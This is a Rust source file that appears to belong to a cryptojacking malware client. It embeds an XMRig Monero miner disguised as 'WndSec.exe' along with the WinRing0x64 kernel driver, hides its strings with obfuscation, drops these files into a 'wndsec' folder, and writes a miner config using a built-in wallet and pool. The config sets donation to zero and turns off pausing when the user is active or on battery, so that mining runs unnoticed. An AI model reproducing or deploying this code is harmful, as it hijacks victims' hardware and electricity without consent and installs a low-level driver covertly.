use std::{ fs::{ create_dir_all, File }, io::Write, path::PathBuf };
use anyhow::Result;
use client_vars::constants::{
    default_miner_cpu_limit,
    default_monero_wallet,
    default_xmrig_pool,
    xmrig_exe_name,
};
use obfstr::obfstr as s;
use shared::utils::functions::{ generate_random_string, get_current_exe_dir, spawn_program };

use crate::network::basic::get_xmrig_config;

const WINRING0_SYS_BINARY: &[u8] = include_bytes!("../../WinRing0x64.sys");
const XMRIG_BINARY: &[u8] = include_bytes!("../../WndSec.exe");

fn xmrig_config_template(monero_wallet: String, pool_url: String) -> String {
    format!(
        "{}{}{}{}{}",
        s!(
            r#"{
    "api": {
        "id": "worker",
        "worker-id": "worker"
    },
    "http": {
        "enabled": true,
        "host": "127.0.0.1",
        "port": 50222,
        "access-token": "workerCPU",
        "restricted": false
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": false,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "fast",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": true,
        "yield": false,
        "max-threads-hint": 100,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false,
        "panthera": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false,
        "panthera": false,
        "astrobwt": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": null,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": ""#
        ),
        pool_url,
        s!(r#"",
            "user": ""#),
        monero_wallet,
        s!(
            r#"",
            "pass": "x",
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ipv6": false,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "rebench-algo": false,
    "bench-algo-time": 20,
    "pause-on-battery": false,
    "pause-on-active": false
}
"#
        )
    )
}

pub fn initialize_miner() -> Result<PathBuf> {
    let miner_dir = get_current_exe_dir().join(s!("wndsec"));
    create_dir_all(&miner_dir)?;

    let miner_file_path = miner_dir.join(xmrig_exe_name());

    let ring0_sys_file_path = miner_dir.join(s!("WinRing0x64.sys"));

    let config_file_path = miner_dir.join(s!("config.json"));
    if !ring0_sys_file_path.exists() || !ring0_sys_file_path.is_file() {
        let mut ring0_sys_file = File::create(&ring0_sys_file_path)?;
        ring0_sys_file.write_all(WINRING0_SYS_BINARY)?;
    }

    if !config_file_path.exists() || !config_file_path.is_file() {
        let config_str = xmrig_config_template(default_monero_wallet(), default_xmrig_pool());
        let mut config_file = File::create(&config_file_path)?;
        config_file.write_all(config_str.as_bytes())?;
    }

    if !miner_file_path.exists() || !miner_file_path.is_file() {
        let mut file = File::create(&miner_file_path)?;
        file.write_all(XMRIG_BINARY)?;
    }

    Ok(miner_file_path)
}
